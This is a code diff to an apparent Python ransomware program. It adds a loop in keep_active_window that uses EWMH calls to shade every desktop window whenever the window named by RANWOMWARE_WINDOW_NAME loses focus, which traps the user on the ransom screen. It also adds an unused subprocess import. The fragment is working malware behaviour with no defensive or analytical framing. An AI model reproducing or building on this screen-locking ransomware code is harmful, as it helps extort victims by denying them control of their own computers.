@@ -11,6 +11,7 @@ import tkinter as tk
 from functools import partial
 from threading import Thread
 from ewmh import EWMH
+import subprocess
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
@@ -179,9 +180,16 @@ def keep_active_window():
     while True:
         ewmh = EWMH()
 
-        # Get the window that you want to focus on (replace 'Window Title' with the actual title)
+        windows_list = ewmh.getClientList()
+
+        if ewmh.getActiveWindow().get_wm_name() != RANWOMWARE_WINDOW_NAME:
+            # Go to the desktop minimizing all the windows one by one
+            for window in windows_list: 
+                ewmh.setWmState(window, 1, '_NET_WM_STATE_SHADED') 
+                ewmh.display.flush()
+
         target_window = None
-        for window in ewmh.getClientList():
+        for window in windows_list:
             if window.get_wm_name() == RANWOMWARE_WINDOW_NAME:
                 target_window = window
                 break
